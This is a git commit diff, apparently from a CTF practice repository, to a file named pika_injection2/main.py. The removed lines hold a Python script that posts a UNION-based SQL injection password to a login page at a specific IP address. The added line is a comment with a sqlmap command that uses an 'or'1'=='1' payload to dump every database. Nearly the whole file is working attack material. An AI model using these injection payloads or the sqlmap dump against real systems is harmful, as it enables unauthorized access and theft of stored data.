98fd925c34f82d9e455c85a1261b89d60c033569
wuling31715 <wuling31715@gmail.com>
2020-06-17 13:03:09 +0800

    .

--- adl/pika_injection2/main.py
+++ adl/pika_injection2/main.py
@@ -1,15 +1,1 @@
-# https://zhuanlan.zhihu.com/p/74907340
-
-import requests
-url = 'http://140.115.59.7:12004/login.php'
-
-username = "1"
-password = "-1' union select -1,-2,database() -- -"
-
-values = {
-    'ctf_username': username,
-    'ctf_password': password,
-    }
-
-r = requests.post(url, data=values)
-print(r.content)
+# sqlmap -u http://140.115.59.7:12004/login.php -data "ctf_username=1&ctf_password=1'or'1'=='1" -batch –dump-all
